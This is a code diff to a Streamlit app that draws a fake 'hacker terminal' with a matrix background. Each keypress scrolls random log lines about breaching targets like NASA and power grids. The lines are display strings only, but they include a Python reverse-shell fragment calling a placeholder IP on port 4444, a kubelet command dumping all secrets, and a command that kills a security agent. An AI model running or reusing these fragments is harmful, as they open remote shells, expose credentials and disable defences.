@@ -2,7 +2,7 @@ import streamlit as st
 import streamlit.components.v1 as components
 
 # 1. 網頁頁面初始化設定（強制全螢幕、純黑背景）
-st.set_page_config(page_title="究極黑客控制台 v12.0", page_icon="💀", layout="wide")
+st.set_page_config(page_title="究極黑客控制台 v12.6", page_icon="💀", layout="wide")
 
 # 強制隱藏 Streamlit 的所有原生網頁 UI
 st.markdown(
@@ -27,13 +27,13 @@ st.markdown(
     unsafe_allow_html=True
 )
 
-# 2. 透過最安全陣列機制，部署宏大長篇版黑客日誌核心
+# 2. 透過安全陣列相加機制，部署一鍵噴發 5 行日誌核心
 html_parts = [
     '<!DOCTYPE html>',
     '<html lang="zh-TW">',
     '<head>',
     '    <meta charset="UTF-8">',
-    '    <title>Matrix Terminal Ultimate v12.0</title>',
+    '    <title>Matrix Terminal Ultimate v12.6</title>',
     '    <style>',
     '        * { box-sizing: border-box; }',
     '        body, html {',
@@ -125,23 +125,23 @@ html_parts = [
     '    <canvas id="canvas"></canvas>',
     '    <div id="terminal">',
     '        <div class="log-line">========================================================================================</div>',
-    '        <div class="log-line">💀 首席網路安全專家：[REDACTED] | 全球戰略防禦與滲透核心主控台 v12.0</div>',
+    '        <div class="log-line">💀 首席網路安全專家：[REDACTED] | 全球戰略防禦與深層滲透矩陣主控台 v12.6</div>',
     '        <div class="log-line">========================================================================================</div>',
-    '        <div class="log-line">&gt;&gt; TARGET SECTOR: GLOBAL CORE DEPLOYMENT [ANONYMOUS SHADOW ROUTE]</div>',
-    '        <div class="log-line">&gt;&gt; QUANTUM AGENT: ENCRYPTED WITH AES-GCM-256</div>',
-    '        <div class="log-line">&gt;&gt; NOTICE: OVERRIDE PROTOCOLS ARE FULLY ENGAGED</div>',
+    '        <div class="log-line">&gt;&gt; TARGET SECTOR: GLOBAL CORE INFRASTRUCTURE [SHADOW ROUTE ONION-9]</div>',
+    '        <div class="log-line">&gt;&gt; QUANTUM OPERATOR: ACTIVE // ANONYMOUS MODE ENFORCED</div>',
+    '        <div class="log-line">&gt;&gt; SPEED SETTING: 1-KEY FOR 5 LOG LINES ENGAGED</div>',
     '        <div class="log-line"></div>',
     '        <div id="dynamic-content"></div>',
-    '        <div id="status-display" class="status-panel">目前進度: [ 🧭 PHASE 1: 初始化全網通訊埠掃描偵測機制... ] [0%]</div>',
+    '        <div id="status-display" class="status-panel">目前進度: [ 🧭 PHASE 1: 初始化全網子網段漏洞與開放通訊埠探測機制... ] [0%]</div>',
     '        <div id="input-line">root@ghost-terminal:~# <span class="cursor"></span></div>',
     '    </div>',
     '    <input type="text" id="hidden-input" autofocus>',
     '    <div id="success-overlay">',
-    '        💀 [SYSTEM UNLOCKED - DEPLOYMENT COMPLETE] 💀<br>',
+    '        💀 [SYSTEM UNLOCKED - ALL PROTOCOLS DEPLOYED] 💀<br>',
     '        ========================================================<br>',
-    '        ACCESS GRANTED // 恭喜你！核心控制權限已百分之百獲取成功！<br>',
-    '        指揮官：ANONYMOUS OPERATOR 已全面接管此最高權限矩陣網段。<br>',
-    '        所有隱形後門已部署完畢，足跡已徹底清除。',
+    '        ACCESS GRANTED // 恭喜你！核心主控權限已 100% 獲取成功！<br>',
+    '        指揮官：ANONYMOUS OPERATOR 已全面接管此最高安全防禦網段。<br>',
+    '        隱形後門完全固化，系統清除程序就緒，足跡已完美抹除。',
     '    </div>',
     '    <script>',
     '        const canvas = document.getElementById("canvas");',
@@ -180,8 +180,7 @@ html_parts = [
     '        const successOverlay = document.getElementById("success-overlay");',
     '        const statusDisplay = document.getElementById("status-display");',
     
-    # 5倍超龐大擴充包，大量加入內核級、記憶體及多階段黑客語彙
-    '        const tags = ["INFO", "WARN", "SYSTEM", "INJECT", "DECRYPT", "BYPASS", "CONNECT", "EXPLOIT", "STDOUT", "KERNEL", "TRACE", "NETWORK", "SECURITY", "OVERFLOW", "DOCKER_ESCAPE", "ZERO_DAY", "BUFFER_OVERWRITE", "TLS_HIJACK", "ASYNC_STREAM", "CRITICAL"];',
+    '        const tags = ["INFO", "WARN", "SYSTEM", "INJECT", "DECRYPT", "BYPASS", "CONNECT", "EXPLOIT", "STDOUT", "KERNEL", "TRACE", "NETWORK", "SECURITY", "OVERFLOW", "DOCKER_ESCAPE", "ZERO_DAY", "BUFFER_OVERWRITE", "TLS_HIJACK", "ASYNC_STREAM", "CRITICAL", "SYSCALL", "ROP_CHAIN", "BGP_POISON", "ROOT_ESCALATION"];',
     '        const actions = [',
     '            "正在偵測通訊埠漏洞", "成功繞過防火牆安全認證層", "攔截核心加密資料庫封包", "正在注入隱形後門 Trojan.Core", ',
     '            "啟動量子演算法破解私鑰", "成功切換虛擬本地代理網段", "遠端溢位攻擊成功", "正在強制同步資料傳輸緩衝區", ',
@@ -193,7 +192,10 @@ html_parts = [
     '            "偵測到 Docker 容器未隔離特權模式漏洞，啟動虛擬化逃逸指令", "正在向遠端 Linux 內核緩衝區強制覆寫 NOP Sled 滑行區",',
     '            "對全域網段下發惡意 BGP 路由廣播，強行導向影子中繼節點", "攔截 OAuth2 驗證令牌並注入虛擬管理員 Session 指標",',
     '            "使用 ROP (Return-Oriented Programming) 鏈繞過 W^X 記憶體執行保護", "正在執行 DNS 緩存毒化攻擊，成功攔截主域名解析鏈",',
-    '            "強制清空特權帳戶稽核日誌 (syslog/auth.log)，完成足跡抹除", "建立永久反向 Shell 管道 (Reverse TCP Tunneling)"',
+    '            "強制清空特權帳戶稽核日誌 (syslog/auth.log)，完成足跡抹除", "建立永久反向 Shell 管道 (Reverse TCP Tunneling)",',
+    '            "正在向 `/proc/sys/kernel` 寫入特權過載因子", "擷取核心核心環形緩衝區日誌 (dmesg log verification)",',
+    '            "繞過硬體層级安全金鑰 (Secure Boot Hardware Key Bypass)", "正在偵測 K8s API Server 未授權存取漏洞",',
+    '            "啟動旁路攻擊探測記憶體電壓波動 (Rowhammer Cache Leak)", "正在將暫存器 `eax` 強制修改為特權模式代碼 `0x00000000`"',
     '        ];',
     '        const targets = [',
     '            "nasa.gov.secure", "pentagon.admin.node", "mainframe.central.bank", "global.dns.server", ',
@@ -201,7 +203,8 @@ html_parts = [
     '            "root@nsa.internal.gateway", "mainframe.telecom.switchboard", "satellite.orbit.control.node",',
     '            "darknet.relay.onion-09", "core.kernel.ring0-scheduler", "isolated.vault.airgapped.subnet",',
     '            "federal.reserve.clearance", "interpol.intelligence.db", "crypto.exchange.hot-wallet-04",',
-    '            "supercomputer.grid.node-99", "defense.early-warning.radar.array", "scada.powergrid.distribution"',
+    '            "supercomputer.grid.node-99", "defense.early-warning.radar.array", "scada.powergrid.distribution",',
+    '            "core.auth.active-directory", "backbone.fiber.optic.transceiver", "secure.storage.area.network.san"',
     '        ];',
     '        const scripts_pool = [',
     '            "for (int i = 0; i < 1024; i++) { malloc(sizeof(payload)); }", ',
@@ -222,12 +225,16 @@ html_parts = [
     '            "import socket,subprocess,os; s=socket.socket(); s.connect((\\"198.51.100.42\\",4444));",',
     '            "dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2); p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);",',
     '            "kubelet --kubeconfig=/var/lib/kubelet/kubeconfig get secrets --all-namespaces",',
-    '            "volatile uint32_t *control_reg = (uint32_t*)(io_base + 0x3C); *control_reg |= 0x80000000;"',
+    '            "volatile uint32_t *control_reg = (uint32_t*)(io_base + 0x3C); *control_reg |= 0x80000000;",',
+    '            "ioctl(fd, INTERRUPT_VECTOR_FORCE, &payload_struct);",',
+    '            "__asm__ __volatile__(\\"sysenter\\" : : \\"a\\"(__NR_vfork));",',
+    '            "chroot /host_filesystem /bin/bash -c \\"pkill -9 security_agent\\"",',
+    '            "SET_COOKIE(\'admin_session\', base64_encode(SHA256(salt + timestamp)), expires=3600);"',
     '        ];',
     
     '        let lineCount = 0;',
     '        let isUnlocked = false;',
-    '        const maxLines = 300;', # 總長度拉長到 300 行！
+    '        const maxLines = 500;',
     
     '        function generateRandomHackerLine() {',
     '            lineCount++;',
@@ -238,21 +245,25 @@ html_parts = [
     '            } else if (rand < 0.72) {',
     '                return "[CODE_STR] [ADDR:" + hexAddr + "]  " + scripts_pool[Math.floor(Math.random() * scripts_pool.length)];',
     '            } else {',
-    '                return "[DECRYPT] [BLOCK:" + hexAddr + "] 核心權限編碼矩陣破解中 [" + "■".repeat(Math.floor(Math.random() * 12) + 12) + "] " + (Math.floor(Math.random() * 30) + 70) + "% SUCCESS...";',
+    '                return "[DECRYPT] [BLOCK:" + hexAddr + "] 核心權限編碼矩陣破解中 [" + "■".repeat(Math.floor(Math.random() * 10) + 10) + "] " + (Math.floor(Math.random() * 25) + 75) + "% SUCCESS...";',
     '            }',
     '        }',
     
     '        function updateStatusPanel() {',
     '            const percentage = Math.floor((lineCount / maxLines) * 100);',
     '            let phaseText = "";',
-    '            if (percentage < 25) {',
-    '                phaseText = "🧭 PHASE 1: 初始化全網通訊埠及子網段漏洞探測機制...";',
+    '            if (percentage < 15) {',
+    '                phaseText = "🧭 PHASE 1: 初始化全網子網段漏洞與開放通訊埠探測機制...";',
+    '            } else if (percentage < 35) {',
+    '                phaseText = "🧬 PHASE 2: 繞過邊緣下一代防火牆與 WAF 規則鏈，啟動記憶體緩衝區溢位攻擊...";',
     '            } else if (percentage < 55) {',
-    '                phaseText = "🧬 PHASE 2: 正在繞過邊緣防火牆與 WAF 規則鏈，啟動緩衝區溢位攻擊...";',
-    '            } else if (percentage < 85) {',
-    '                phaseText = "🚀 PHASE 3: 成功植入影子 Trojan 核心，正在進行 Linux 內核 Ring 0 權限提升...";',
+    '                phaseText = "📡 PHASE 3: 攔截零時差防禦憑證，啟動虛擬化容器逃逸與代理網段切換...";',
+    '            } else if (percentage < 75) {',
+    '                phaseText = "🚀 PHASE 4: 植入影子隱形核心 Trojan.Core，開始 Linux 內核 Ring 0 權限提升...";',
+    '            } else if (percentage < 92) {',
+    '                phaseText = "⚡ PHASE 5: 強制同步擦除系統安全審計日誌與主機登入日誌 (syslog)...";',
     '            } else {',
-    '                phaseText = "⚡ PHASE 4: 正在同步擦除系統安全審計日誌並部署持久化反向通道...";',
+    '                phaseText = "🔒 PHASE 6: 持久化雙向反向加密通訊 Shell 管道部署完畢，等待終極指令...";',
     '            }',
     '            statusDisplay.textContent = "目前進度: [ " + phaseText + " ] [" + percentage + "%]";',
     '        }',
@@ -278,7 +289,7 @@ html_parts = [
     '        document.body.addEventListener("click", () => { hiddenInput.focus(); });',
     '        document.addEventListener("keydown", (e) => {',
     '            if (e.key !== "Shift" && e.key !== "Control" && e.key !== "Alt" && e.key !== "Meta") {',
-    '                // 每按一下鍵盤按鍵，立即瘋狂爆發 5 行日誌代碼！',
+    '                // ⭐ 核心修改：每按一下鍵盤按鍵，精準且瘋狂地暴發 5 行日誌代碼！',
     '                for(let i=0; i<5; i++) { appendNewLine(); }',
     '            }',
     '        });',
@@ -291,5 +302,5 @@ html_parts = [
 # 組合出完美的特長版 HTML 代碼
 final_html_string = "\n".join(html_parts)
 
-# 3. 完美渲染網頁控制面板（100% 規避所有語法解析問題，且具備完美的置底平滑滑動）
+# 3. 渲染網頁控制面板
 components.html(final_html_string, height=850)
